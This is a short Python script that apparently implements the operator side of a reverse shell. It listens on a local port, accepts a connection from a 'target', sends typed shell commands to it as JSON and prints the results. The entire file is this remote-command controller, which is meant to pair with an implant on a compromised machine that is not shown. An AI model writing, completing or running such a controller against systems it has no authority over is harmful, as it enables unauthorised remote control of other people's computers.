import socket
import json

IP = '127.0.0.1'
PORT = 1234

def j_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def j_recv():

    data = ''

    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def target_comun():
    while True:
        
        command = input(f"$[{ip}] Shell >")
        j_send(command)

        if command == 'quit' or command == "exit":
            break

# cd /home

        elif command[:3] == 'cd ':
            pass

        response = j_recv()
        print(response)      



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((IP, PORT))

s.listen(1)
print(f"Listening On {PORT}")

target, ip = s.accept()
print(f"Connection Established From {ip}")
target_comun()